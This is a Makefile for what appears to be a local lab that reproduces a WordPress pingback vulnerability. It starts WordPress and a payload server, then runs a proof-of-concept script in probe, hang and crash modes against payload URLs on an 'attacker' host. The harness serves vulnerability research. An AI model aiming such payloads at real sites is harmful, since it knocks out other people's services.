SHELL := /bin/bash
COMPOSE ?= docker compose
-include .env

WP_PORT ?= 8080
ATTACKER_PORT ?= 8081
TARGET ?= http://localhost:$(WP_PORT)
HANG ?= http://attacker:8080/small.br
CRASH ?= http://attacker:8080/payload.br
POC := python3 poc/pingback_poc.py

.PHONY: up down reset probe verify hang crash restart logs

up:
	$(COMPOSE) up -d --build
	$(COMPOSE) run --rm wp-init
	@echo "[+] WordPress: $(TARGET)"
	@echo "[+] Payload server: http://localhost:$(ATTACKER_PORT)/health"

down:
	$(COMPOSE) down

reset:
	$(COMPOSE) down -v

probe:
	$(POC) --target $(TARGET) --mode probe

verify:
	./scripts/verify-vulnerable.sh

hang:
	$(POC) --target $(TARGET) --mode hang --payload-url $(HANG) --show-logs

crash:
	$(POC) --target $(TARGET) --mode crash --payload-url $(CRASH) --show-logs

restart:
	$(COMPOSE) restart wordpress

logs:
	$(COMPOSE) logs -f wordpress nginx
